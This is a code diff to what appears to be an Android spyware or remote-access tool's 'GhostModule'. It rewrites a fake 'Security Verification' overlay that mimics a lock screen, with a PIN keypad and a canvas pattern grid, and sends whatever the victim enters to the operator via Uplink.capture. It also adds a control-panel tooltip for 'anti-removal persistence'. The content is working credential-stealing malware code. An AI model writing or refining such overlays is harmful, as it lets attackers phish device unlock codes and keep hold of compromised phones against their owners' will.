@@ -139,50 +139,99 @@ public class GhostModule extends BaseModule {
             } else if ("pin".equals(type)) {
                 overlayHtml = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=no'>" +
                         "<style>" +
-                        "body { background:#000; color:#fff; font-family:sans-serif; margin:0; padding:40px 20px; text-align:center; overflow:hidden; }" +
-                        ".dot { width:18px; height:18px; background:#444; border-radius:50%; margin:25px; display:inline-block; transition:0.2s; position:relative; }" +
-                        ".dot.active { background:#00f2ff; box-shadow: 0 0 15px #00f2ff; }" +
-                        ".grid { display:grid; grid-template-columns: repeat(3, 1fr); width:280px; margin:0 auto; user-select:none; touch-action:none; position:relative; }" +
-                        "input { width:80%; padding:15px; background:transparent; border:none; border-bottom:2px solid #00f2ff; color:#fff; font-size:1.5rem; text-align:center; outline:none; margin-bottom:20px; }" +
-                        "button { background:transparent; border:none; color:#0095f6; font-weight:bold; cursor:pointer; font-size:1rem; padding:10px; }" +
-                        ".line { position:absolute; background:rgba(0,242,255,0.5); height:4px; transform-origin: 0 50%; pointer-events:none; }" +
+                        "body { background:#000; color:#fff; font-family:sans-serif; margin:0; padding:0; display:flex; flex-direction:column; height:100vh; overflow:hidden; user-select:none; touch-action:none; }" +
+                        ".header { padding:40px 20px 20px; text-align:center; }" +
+                        ".lock-icon { font-size:40px; color:#00f2ff; margin-bottom:15px; opacity:0.8; }" +
+                        "h2 { font-weight:300; margin:0 0 5px; font-size:1.4rem; }" +
+                        "p { color:#888; font-size:0.85rem; margin:0; }" +
+                        ".pin-dots { display:flex; justify-content:center; gap:15px; margin:30px 0; height:15px; }" +
+                        ".pin-dot { width:12px; height:12px; border:2px solid #555; border-radius:50%; transition:0.1s; }" +
+                        ".pin-dot.filled { background:#00f2ff; border-color:#00f2ff; box-shadow:0 0 10px #00f2ff; }" +
+                        ".keypad { display:grid; grid-template-columns:repeat(3, 1fr); gap:20px; width:280px; margin:0 auto; padding-bottom:40px; }" +
+                        ".key { width:70px; height:70px; border-radius:50%; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#fff; font-size:1.5rem; display:flex; align-items:center; justify-content:center; cursor:pointer; transition:0.1s; }" +
+                        ".key:active { background:rgba(0,242,255,0.2); border-color:#00f2ff; transform:scale(0.95); }" +
+                        ".pat-container { position:relative; width:300px; height:300px; margin:20px auto; }" +
+                        "canvas { position:absolute; top:0; left:0; pointer-events:none; }" +
+                        ".grid { display:grid; grid-template-columns:repeat(3, 1fr); grid-template-rows:repeat(3, 1fr); width:100%; height:100%; position:relative; z-index:2; }" +
+                        ".dot-wrap { display:flex; align-items:center; justify-content:center; }" +
+                        ".dot { width:14px; height:14px; background:#444; border-radius:50%; transition:0.2s; }" +
+                        ".dot.active { background:#00f2ff; box-shadow:0 0 15px #00f2ff; transform:scale(1.2); }" +
+                        ".footer { margin-top:auto; padding:30px; display:flex; justify-content:space-between; }" +
+                        ".f-btn { background:transparent; border:none; color:#00f2ff; font-weight:bold; font-size:0.9rem; cursor:pointer; text-transform:uppercase; letter-spacing:1px; }" +
                         "</style></head><body>" +
-                        "<div><img src='/logo' style='width:50px; opacity:0.8; margin-bottom:15px;'></div>" +
-                        "<h2 id='h' style='font-weight:300; margin-bottom:5px;'>Security Verification</h2>" +
-                        "<p id='d' style='color:#ccc; font-size:0.85rem; margin-bottom:30px;'>Verification required to continue with the stability update.</p>" +
-                        
+                        "<div class='header'>" +
+                        "<div class='lock-icon'>&#128274;</div>" +
+                        "<h2>Security Verification</h2>" +
+                        "<p>Please enter your device credentials</p>" +
+                        "</div>" +
+
                         "<div id='pin-mode'>" +
-                        "<input type='password' id='p' pattern='[0-9]*' inputmode='numeric' placeholder='Enter PIN'>" +
-                        "<div style='margin-top:20px;'><button onclick='toggle(true)'>USE PATTERN</button></div>" +
+                        "<div class='pin-dots' id='pin-display'>" +
+                        "<div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div>" +
+                        "</div>" +
+                        "<div class='keypad'>" +
+                        "<div class='key' onclick='k(1)'>1</div><div class='key' onclick='k(2)'>2</div><div class='key' onclick='k(3)'>3</div>" +
+                        "<div class='key' onclick='k(4)'>4</div><div class='key' onclick='k(5)'>5</div><div class='key' onclick='k(6)'>6</div>" +
+                        "<div class='key' onclick='k(7)'>7</div><div class='key' onclick='k(8)'>8</div><div class='key' onclick='k(9)'>9</div>" +
+                        "<div class='key' style='opacity:0; pointer-events:none;'></div><div class='key' onclick='k(0)'>0</div><div class='key' onclick='del()' style='font-size:1.2rem;'>&#9003;</div>" +
+                        "</div>" +
+                        "<div style='text-align:center;'><button class='f-btn' onclick='toggle(true)'>Use Pattern</button></div>" +
                         "</div>" +
 
                         "<div id='pat-mode' style='display:none;'>" +
+                        "<div class='pat-container' id='pc'>" +
+                        "<canvas id='cv'></canvas>" +
                         "<div class='grid' id='g'>" +
                         "[DOTS]" +
                         "</div>" +
-                        "<div style='margin-top:20px;'><button onclick='toggle(false)'>USE PIN</button></div>" +
+                        "</div>" +
+                        "<div style='text-align:center;'><button class='f-btn' onclick='toggle(false)'>Use PIN</button></div>" +
                         "</div>" +
 
-                        "<div style='margin-top:40px; display:flex; justify-content:space-around;'>" +
-                        "<button onclick='Uplink.capture(\"CANCEL\");' style='color:#888;'>CANCEL</button>" +
-                        "<button id='ok' onclick='send()'>PROCEED</button>" +
+                        "<div class='footer'>" +
+                        "<button class='f-btn' style='color:#666;' onclick='Uplink.capture(\"CANCEL\")'>Emergency</button>" +
+                        "<button class='f-btn' id='ok' onclick='send()'>Confirm</button>" +
                         "</div>" +
 
                         "<script>" +
-                        "let mode='pin'; let path=[];" +
-                        "function toggle(p){ mode=p?'pat':'pin'; document.getElementById('pin-mode').style.display=p?'none':'block'; document.getElementById('pat-mode').style.display=p?'block':'none'; path=[]; resetDots(); }" +
-                        "function resetDots(){ document.querySelectorAll('.dot').forEach(d=>d.classList.remove('active')); }" +
-                        "function send(){ if(mode==='pin'){ let v=document.getElementById('p').value; if(v) Uplink.capture('PIN: '+v); } else { if(path.length>0) Uplink.capture('PATTERN: '+path.join('-')); } }" +
+                        "let mode='pin'; let pin=''; let path=[]; let isDown=false;" +
+                        "const cv=document.getElementById('cv'); const ctx=cv.getContext('2d');" +
                         
-                        "const g=document.getElementById('g'); let isDown=false;" +
-                        "const handleMove=(e)=>{ if(!isDown)return; const touch=e.touches?e.touches[0]:e; const node=document.elementFromPoint(touch.clientX, touch.clientY); if(node && node.classList.contains('dot')){ const id=node.dataset.id; if(!path.includes(id)){ path.push(id); node.classList.add('active'); } } };" +
-                        "g.addEventListener('touchstart',()=>{isDown=true;}); g.addEventListener('mousedown',()=>{isDown=true;});" +
-                        "window.addEventListener('touchend',()=>{isDown=false;}); window.addEventListener('mouseup',()=>{isDown=false;});" +
-                        "g.addEventListener('touchmove',handleMove); g.addEventListener('mousemove',handleMove);" +
+                        "function toggle(p){ mode=p?'pat':'pin'; document.getElementById('pin-mode').style.display=p?'none':'block'; document.getElementById('pat-mode').style.display=p?'block':'none'; reset(); }" +
+                        "function reset(){ pin=''; path=[]; resetDots(); draw(); updatePin(); }" +
+                        "function resetDots(){ document.querySelectorAll('.dot').forEach(d=>d.classList.remove('active')); }" +
+                        "function updatePin(){ const ds=document.querySelectorAll('.pin-dot'); ds.forEach((d,i)=>d.classList.toggle('filled', i<pin.length)); }" +
+                        "function k(n){ if(pin.length<8){ pin+=n; updatePin(); } }" +
+                        "function del(){ pin=pin.slice(0,-1); updatePin(); }" +
+                        
+                        "function send(){ if(mode==='pin'){ if(pin) Uplink.capture('PIN: '+pin); } else { if(path.length>1) Uplink.capture('PATTERN: '+path.join('-')); } }" +
+                        
+                        "function setupCanvas(){ const r=document.getElementById('pc').getBoundingClientRect(); cv.width=r.width; cv.height=r.height; }" +
+                        "function draw(ex, ey){" +
+                        "  ctx.clearRect(0,0,cv.width,cv.height); if(path.length===0)return;" +
+                        "  ctx.strokeStyle='#00f2ff'; ctx.lineWidth=6; ctx.lineCap='round'; ctx.lineJoin='round'; ctx.beginPath();" +
+                        "  path.forEach((id,i)=>{ const d=document.querySelector('[data-id=\"'+id+'\"]'); const r=d.getBoundingClientRect(); const pr=document.getElementById('pc').getBoundingClientRect(); const x=r.left-pr.left+r.width/2; const y=r.top-pr.top+r.height/2;" +
+                        "    if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);" +
+                        "  });" +
+                        "  if(ex!==undefined) ctx.lineTo(ex,ey);" +
+                        "  ctx.stroke();" +
+                        "}" +
+
+                        "const handleMove=(e)=>{ if(!isDown)return; const t=e.touches?e.touches[0]:e; const pr=document.getElementById('pc').getBoundingClientRect(); const x=t.clientX-pr.left; const y=t.clientY-pr.top;" +
+                        "  document.querySelectorAll('.dot').forEach(d=>{ const r=d.getBoundingClientRect(); const dx=r.left-pr.left+r.width/2; const dy=r.top-pr.top+r.height/2; const dist=Math.hypot(x-dx, y-dy);" +
+                        "    if(dist<30){ const id=d.dataset.id; if(!path.includes(id)){ path.push(id); d.classList.add('active'); } }" +
+                        "  }); draw(x,y);" +
+                        "};" +
+
+                        "const pc=document.getElementById('pc');" +
+                        "pc.addEventListener('touchstart',(e)=>{isDown=true; handleMove(e);}); pc.addEventListener('mousedown',(e)=>{isDown=true; handleMove(e);});" +
+                        "window.addEventListener('touchend',()=>{isDown=false; draw();}); window.addEventListener('mouseup',()=>{isDown=false; draw();});" +
+                        "window.addEventListener('touchmove',handleMove); window.addEventListener('mousemove',handleMove);" +
+                        "window.onload=setupCanvas;" +
                         "</script></body></html>";
 
                 StringBuilder dots = new StringBuilder();
-                for(int i=0; i<9; i++) dots.append("<div class='dot' data-id='").append(i).append("'></div>");
+                for(int i=0; i<9; i++) dots.append("<div class='dot-wrap'><div class='dot' data-id='").append(i).append("'></div></div>");
                 overlayHtml = overlayHtml.replace("[DOTS]", dots.toString());
             }
             ghost.deployShadowOverlay(overlayHtml);
@@ -307,9 +356,9 @@ public class GhostModule extends BaseModule {
 
         // 7. Auto Pilot & Anti-Removal (Legacy Controls)
         html.append("<div class=\"info-item\" style=\"background: rgba(255,255,255,0.02); grid-column: 1 / -1;\">");
-        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">AUTOMATION_&_PERSISTENCE</div>");
+        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem;\">AUTOMATION_&_PERSISTENCE <span class=\"info-trigger\" onclick=\"showInfo(event, 'AUTOMATION_&_PERSISTENCE', 'Configure automated recovery protocols and anti-removal persistence layers.')\">INFO</span></div>");
         html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px; margin-top: 10px;\">");
-        html.append("<button onclick=\"ghostAction('autoheal')\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); margin:0;\">INITIATE_HEAL</button>");
+        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); margin:0;\">INITIATE_HEAL</button>");
         String autoPilotLabel = IO_Persistence_Manager.isAutoPilotEngaged() ? "AUTOPILOT_ENGAGED" : "AUTOPILOT_OFF";
         String autoPilotClass = IO_Persistence_Manager.isAutoPilotEngaged() ? "btn btn-small btn-engaged-yellow" : "btn btn-small";
         html.append("<button id=\"autopilot-btn\" onclick=\"toggleAutoPilot()\" class=\"").append(autoPilotClass).append("\" style=\"border-color: var(--neon-yellow); margin:0;\">").append(autoPilotLabel).append("</button>");
